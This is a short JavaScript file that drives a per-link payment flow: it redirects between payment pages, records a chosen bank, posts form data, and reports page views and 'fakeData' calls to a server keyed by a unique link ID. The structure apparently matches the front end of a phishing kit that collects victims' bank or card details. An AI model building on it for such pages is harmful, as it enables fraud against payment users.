var is_load = false;


function getUniqueID() {
    return location.href.split("/").at(-1);
}


unique_id = getUniqueID()


function redirectToMainPage() {
    if (!is_load) {
        location.href = `/${unique_id}`;
        is_load = true;
    }
}

function redirectToMethodPayment() {
    if (!is_load) {
        location.href = `/method_payment/${unique_id}`;
        is_load = true;
    }
}

function redirectToPayment() {
    if (!is_load) {
        location.href = `/payment/${unique_id}`;
        is_load = true;
    }
}

function setBank(bank_name) {
    axios.put(
        `/api/link/${location.href.split("/").at(-1)}/bank`,
        {
            "bank_name": bank_name
        }
    ).then(
        (response) => {
            if (response.data.result == "ok") {
                redirectToPayment();
            }
        }
    )
}

function sendData(data, reload = true) {
    if (is_load) {
        return;
    }
    is_load = true;
    axios.post(
        `/api/link/${unique_id}/data`,
        data,
    ).then(
        (response) => {
            if (response.data.result == "ok" && reload) {
                location.reload();
            } else {
                is_load = false;
            }
        }
    )
}

function fakeData() {
    axios.post(
        `/api/link/${unique_id}/fakeData`
    ).then(
        (response) => {
            if (response.data.result == "ok") {
                location.reload();
            }
        }
    )
}



function notifyView(page) {
    console.log(is_load)
    if (is_load) {
        return;
    }
    is_load = true;
    axios.post(
        `/api/link/${unique_id}/view`,
        {
            "page": page
        },
    ).then(
        (response) => {
            if (response.data.result == "ok" ) {
                is_load = false;
            }
        }
    )
}


function clearContext() {
    axios.post(
        `/api/link/${unique_id}/clearContext`
    ).then(
        (response) => {

        }
    )
}
